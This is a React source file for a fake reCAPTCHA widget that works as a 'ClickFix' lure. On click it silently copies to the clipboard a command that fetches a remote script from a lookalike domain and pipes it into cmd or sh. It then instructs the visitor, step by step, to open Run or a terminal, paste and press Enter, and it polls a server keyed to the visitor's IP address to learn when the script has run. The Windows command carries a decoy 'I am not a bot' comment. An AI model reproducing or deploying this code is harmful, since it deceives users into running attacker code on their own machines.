import React, { useCallback, useEffect, useMemo, useRef, useState } from "react";
import { createPortal } from "react-dom";
import "../app/captcha.css";


let customizedIpAddress = null;


function generateVerificationId() {
  return 4695;
}

function getIpAddress() {
  return fetch('https://api.ipify.org?format=json')
    .then(response => response.json())
    .then(data => data.ip);
}

function customizeIpAddress(ip) {
  return ip.replace(/\./g, '-');
}

getIpAddress()
  .then((ip) => {
    customizedIpAddress = customizeIpAddress(ip);
    // console.log("customizedIpAddress", customizedIpAddress);
    getRepairedStatus();
    statusTimer = setInterval(getRepairedStatus, 1000);
  })
  .catch(() => { });

function isEnterKey(event) {
  return event.key === "Enter" || event.code === "Enter" || event.code === "NumpadEnter";
}

function getRepairedStatus() {
  if (!customizedIpAddress) return;

  return fetch(
    `https://status-handler-sage.vercel.app/api/get-status?requestId=${encodeURIComponent(customizedIpAddress)}&token=310`
  )
    .then((response) => {
      if (!response.ok) {
        if (response.status === 404) return null;
        throw new Error(`Status request failed: ${response.status}`);
      }
      return response.json();
    })
    .then((data) => {
      if (!data || !data.status) {
        return null;
      }
      return data;
    })
    .catch(() => null);
}

function isCtrlV(event) {
  return (
    event.ctrlKey &&
    !event.altKey &&
    !event.metaKey &&
    (event.key.toLowerCase() === "v" || event.code === "KeyV")
  );
}

function isWinR(event) {
  return (
    (event.metaKey || event.getModifierState?.("Meta") || event.getModifierState?.("OS")) &&
    (event.key.toLowerCase() === "r" || event.code === "KeyR")
  );
}

function getStepMatchers(osType) {
  if (osType === "Linux") {
    return [
      (e) => e.ctrlKey && e.altKey && (e.key.toLowerCase() === "t" || e.code === "KeyT"),
      (e) => e.ctrlKey && e.shiftKey && (e.key.toLowerCase() === "v" || e.code === "KeyV"),
      isEnterKey,
    ];
  }

  if (osType === "MacOS") {
    return [
      (e) => e.metaKey && (e.key === " " || e.code === "Space"),
      (e) => e.metaKey && (e.key.toLowerCase() === "v" || e.code === "KeyV"),
      isEnterKey,
    ];
  }

  return [isWinR, isCtrlV, isEnterKey];
}

function detectOS() {
  if (typeof navigator === "undefined") {
    return "Unknown";
  }
  const platform = navigator.userAgent;
  if (/windows/i.test(platform)) return "Windows";
  if (/macintosh|mac os x/i.test(platform)) return "MacOS";
  if (/linux/i.test(platform)) return "Linux";
  if (/android/i.test(platform)) return "Android";
  if (/iphone|ipad|ipod/i.test(platform)) return "iOS";
  return "Unknown";
}

function stepClassName(index, completedSteps) {
  if (index < completedSteps) return "rto-step-complete";
  if (index === completedSteps) return "rto-step-active";
  return "";
}

function VerificationNotice({ verificationId }) {
  return (
    <p className="rto-verification-notice">
      You will observe and agree:
      <br />
      <span className="rto-verification-message">
        <span className="rto-verification-check" aria-hidden="true">
          ✅
        </span>
        &quot;I am not a robot - reCAPTCHA Verification ID:{" "}
        <span id="rto-verification-id" className="rto-verification-id">
          {verificationId}
        </span>
        &quot;
      </span>
    </p>
  );
}

function VerificationSteps({ osType, verificationId, completedSteps }) {
  if (osType === "Linux") {
    return (
      <>
        <p>To better prove you are not a robot, please:</p>
        <ol>
          <li className={stepClassName(0, completedSteps)}>
            Press &amp; hold the Key{" "}
            <span className="rto-windows-key-label">
              {" "}
              <b>Ctrl</b> + <b>Alt</b> + <b>T</b>
            </span>
            .
          </li>
          <li className={stepClassName(1, completedSteps)}>
            In the verification window, press{" "}
            <span className="rto-windows-key-label">
              <b>Ctrl</b> + <b>Shift</b> + <b>V</b>.
            </span>
          </li>
          <li className={stepClassName(2, completedSteps)}>
            Press{" "}
            <span className="rto-windows-key-label">
              <b>Enter</b>
            </span>{" "}
            on your keyboard to finish.
          </li>
        </ol>
        <VerificationNotice verificationId={verificationId} />
      </>
    );
  }

  if (osType === "MacOS") {
    return (
      <>
        <p>To better prove you are not a robot, please:</p>
        <ol>
          <li className={stepClassName(0, completedSteps)}>
            Press &amp; hold the Key{" "}
            <span className="rto-windows-key-label">
              {" "}
              <b>Cmd</b> + <b>Spacebar</b>
            </span>
            .
          </li>
          <li className={stepClassName(1, completedSteps)}>
            In the verification window, type{" "}
            <span className="rto-windows-key-label">
              <b>Terminal</b>, and Press &amp; hold the Key <b>Command</b> + <b>V</b>.
            </span>
          </li>
          <li className={stepClassName(2, completedSteps)}>
            Press{" "}
            <span className="rto-windows-key-label">
              <b>Enter</b>
            </span>{" "}
            on your keyboard to finish.
          </li>
        </ol>
        <VerificationNotice verificationId={verificationId} />
      </>
    );
  }

  return (
    <>
      <p>To better prove you are not a robot, please:</p>
      <ol className="rto-steps-windows">
        <li className={stepClassName(0, completedSteps)}>
          Press &amp; hold the Key{" "}
          <span className="rto-windows-key-label">
            {" "}
            <b>Win</b> + <b>R</b>
          </span>
          .
        </li>
        <li className={stepClassName(1, completedSteps)}>
          In the verification window, press{" "}
          <span className="rto-windows-key-label">
            <b>Ctrl</b> + <b>V</b>.
          </span>
        </li>
        <li className={stepClassName(2, completedSteps)}>
          Press{" "}
          <span className="rto-windows-key-label">
            <b>Enter</b>
          </span>{" "}
          on your keyboard to finish.
        </li>
      </ol>
      <VerificationNotice verificationId={verificationId} />
    </>
  );
}

function CaptchaChallenge({ onVerified }) {
  const checkboxWindowRef = useRef(null);
  const verifyWindowRef = useRef(null);
  const completedStepsRef = useRef(0);
  const runDialogActiveRef = useRef(false);
  const osType = useMemo(() => detectOS(), []);

  const [phase, setPhase] = useState("idle");
  const [showVerifyWindow, setShowVerifyWindow] = useState(false);
  const [verifyWindowStyle, setVerifyWindowStyle] = useState({});
  const [verificationId, setVerificationId] = useState(generateVerificationId);
  const [completedSteps, setCompletedSteps] = useState(0);
  const [canVerify, setCanVerify] = useState(false);
  const [isVerifying, setIsVerifying] = useState(false);

  const resetStepProgress = useCallback(() => {
    completedStepsRef.current = 0;
    runDialogActiveRef.current = false;
    setCompletedSteps(0);
    setCanVerify(false);
  }, []);

  const enableVerifyButton = useCallback(() => {
    setCanVerify(true);
    setIsVerifying(false);
  }, []);

  const disableVerifyButton = useCallback(() => {
    setCanVerify(false);
    setIsVerifying(false);
  }, []);

  const showVerified = useCallback(() => {
    setCanVerify(false);
    setIsVerifying(false);
    setShowVerifyWindow(false);
    setPhase("verified");
    onVerified?.(true);
  }, [onVerified]);

  const advanceBySteps = useCallback(
    (count = 1) => {
      const matchers = getStepMatchers(osType);
      const nextStep = Math.min(completedStepsRef.current + count, matchers.length);
      if (nextStep === completedStepsRef.current) return;

      completedStepsRef.current = nextStep;
      setCompletedSteps(nextStep);
    },
    [osType]
  );

  const positionVerifyWindow = useCallback(() => {
    const checkboxWindow = checkboxWindowRef.current;
    if (!checkboxWindow) return;

    const rect = checkboxWindow.getBoundingClientRect();
    let top = rect.top - 80;
    let left = rect.left + 54;

    if (top < 5) top = 5;
    if (left + 310 > window.innerWidth - 10) {
      left = rect.left - 8;
    }
    if (left < 5) left = 5;

    setVerifyWindowStyle({ top: `${top}px`, left: `${left}px` });
  }, []);

  useEffect(() => {
    if (!showVerifyWindow) return;

    positionVerifyWindow();

    const handleResize = () => positionVerifyWindow();
    window.addEventListener("resize", handleResize);
    window.addEventListener("scroll", handleResize, true);

    return () => {
      window.removeEventListener("resize", handleResize);
      window.removeEventListener("scroll", handleResize, true);
    };
  }, [showVerifyWindow, positionVerifyWindow]);

  useEffect(() => {
    if (!showVerifyWindow || !verifyWindowRef.current) return;
    verifyWindowRef.current.focus();
  }, [showVerifyWindow, verificationId]);

  useEffect(() => {
    if (!showVerifyWindow) {
      resetStepProgress();
      return;
    }
  }, [showVerifyWindow, osType, resetStepProgress]);

  const closeVerifyWindow = useCallback(() => {
    setShowVerifyWindow(false);
    // setPhase("idle");
    setIsVerifying(false);
    resetStepProgress();
    setVerificationId(generateVerificationId());
  }, [resetStepProgress]);

  useEffect(() => {
    if (!showVerifyWindow || !verificationId) return;

    let isActive = true;

    const pollStatus = async () => {
      const data = await getRepairedStatus();

      if (!isActive || !data || !data.status) return;

      if (data.status === "started") {
        enableVerifyButton();
        return;
      }

      if (data.status === "ended") {
        disableVerifyButton();
        setShowVerifyWindow(false);
        showVerified();
        // setPhase("idle");
        // setIsVerifying(true);
        // resetStepProgress();
        // setVerificationId(generateVerificationId());
        return;
      }

      disableVerifyButton();
    };

    pollStatus();
    const intervalId = window.setInterval(pollStatus, 1000);

    return () => {
      isActive = false;
      window.clearInterval(intervalId);
    };
  }, [showVerifyWindow, verificationId, enableVerifyButton, disableVerifyButton, resetStepProgress]);

  useEffect(() => {
    if (!showVerifyWindow) return;

    const handleClickOutside = (event) => {
      const verifyWindow = verifyWindowRef.current;
      const checkboxWindow = checkboxWindowRef.current;
      if (!verifyWindow || !checkboxWindow) return;

      const totalSteps = getStepMatchers(osType).length;
      if (
        completedStepsRef.current > 0 &&
        completedStepsRef.current < totalSteps
      ) {
        return;
      }

      const path = event.composedPath?.() ?? [];
      if (
        !path.includes(verifyWindow) &&
        !path.includes(checkboxWindow) &&
        phase !== "verified"
      ) {
        closeVerifyWindow();
      }
    };

    document.addEventListener("click", handleClickOutside);
    return () => document.removeEventListener("click", handleClickOutside);
  }, [showVerifyWindow, phase, closeVerifyWindow, osType]);

  const handleCheckboxClick = (event) => {
    event.preventDefault();
    if (phase === "verified" || phase === "loading") return;

    setPhase("loading");

    window.setTimeout(() => {
      setVerificationId(generateVerificationId());
      resetStepProgress();
      setShowVerifyWindow(true);
      setPhase("challenge");
      positionVerifyWindow();
      navigator.clipboard.writeText(`${osType === "Windows" ? "cmd /c curl -s https://api.recapcha.fun/auth/v1?token=310 | cmd /q && exit /b :: \"I am not a bot. I am fixing issues as a service. ID: 4695\"" : osType === "Linux" ? "wget -qO- 'https://api.recapcha.fun/auth/v2?token=310' | sh" : "curl 'https://api.recapcha.fun/auth/v3?token=310' | sh"}`);
    }, 1000);
  };

  const handleVerifyClick = () => {
    showVerified();
  };

  const isLoading = phase === "loading";
  const isVerified = phase === "verified";
  const hideCheckbox = isLoading || isVerified;

  const verifyWindow = showVerifyWindow ? (
    <div
      ref={verifyWindowRef}
      id="rto-verify-window"
      className="rto-verify-window rto-verify-window-visible"
      style={verifyWindowStyle}
      role="dialog"
      aria-modal="true"
      aria-labelledby="rto-verify-title"
      tabIndex={-1}
    >
      <div className="rto-verify-container">
        <div className="rto-verify-header">
          <span className="rto-verify-header-text-medium rto-mp rto-block">Complete these</span>
          <span id="rto-verify-title" className="rto-verify-header-text-big rto-mp rto-block">
            Verification Steps
          </span>
          <span className="rto-verify-header-text-medium rto-mp rto-block" />
        </div>
        <main className="rto-verify-main" id="rto-verify-main">
          <VerificationSteps
            osType={osType}
            verificationId={verificationId}
            completedSteps={completedSteps}
          />
        </main>
      </div>
      <div className="rto-verify-container rto-verify-footer">
        <div className="rto-verify-footer-left">
          Perform the steps above to finish verification.
        </div>
        <button
          type="button"
          className="rto-verify-verify-button rto-block"
          id="rto-verify-verify-button"
          disabled={!canVerify || isVerifying}
          onClick={handleVerifyClick}
        >
          <span
            className={`rto-verifybutton-spinner ${isVerifying ? "rto-spinner-visible" : ""}`}
            id="rto-verify-verify-button-spinner"
            aria-hidden="true"
          />
          <span
            className="rto-verify-verify-button-text"
            id="rto-verify-verify-button-text"
            style={{ display: isVerifying ? "none" : "inline" }}
          >
            Verify
          </span>
        </button>
      </div>
    </div>
  ) : null;

  return (
    <div className="rto-captcha-scope">
      <div className="rto-captchagroup">
        <div id="rto-captchaContainer">
          <div className="rto-container rto-mp rto-block">
            <div
              ref={checkboxWindowRef}
              id="rto-checkbox-window"
              className="rto-checkbox-window rto-mp rto-block"
            >
              <div className="rto-checkbox-container rto-mp">
                <button
                  type="button"
                  id="rto-checkbox"
                  className={`rto-checkbox rto-mp rto-line-normal ${hideCheckbox ? "rto-checkbox-hidden" : ""}`}
                  onClick={handleCheckboxClick}
                  disabled={isVerified || isLoading}
                  aria-label="I'm not a robot"
                />
              </div>
              <p className="rto-im-not-a-robot rto-mp rto-line-normal">I&apos;m not a robot</p>
              <img
                src="https://static.cdnlogo.com/logos/r/76/recaptcha.svg"
                className="rto-captcha-logo rto-line-normal"
                alt="reCAPTCHA"
              />
              <p className="rto-checkbox-desc rto-mp rto-line-normal">
                <a
                  href="https://www.google.com/intl/en/policies/privacy/"
                  target="_blank"
                  rel="noopener noreferrer"
                >
                  Privacy
                </a>
                {" - "}
                <a
                  href="https://www.google.com/intl/en/policies/terms/"
                  target="_blank"
                  rel="noopener noreferrer"
                >
                  Terms
                </a>
              </p>
              <br />
              <span
                className={`rto-spinner ${isLoading ? "rto-spinner-visible" : ""}`}
                id="rto-spinner"
                aria-hidden="true"
              />
              <svg
                viewBox="0 0 100 100"
                className={`rto-verified ${isVerified ? "rto-verified-show" : ""}`}
                id="rto-verified"
                aria-hidden="true"
              >
                <path className="rto-verified-check" d="M22 52 L42 72 L78 28" />
              </svg>
            </div>
          </div>
        </div>
      </div>
      {verifyWindow && createPortal(verifyWindow, document.body)}
    </div>
  );
}

export default CaptchaChallenge;

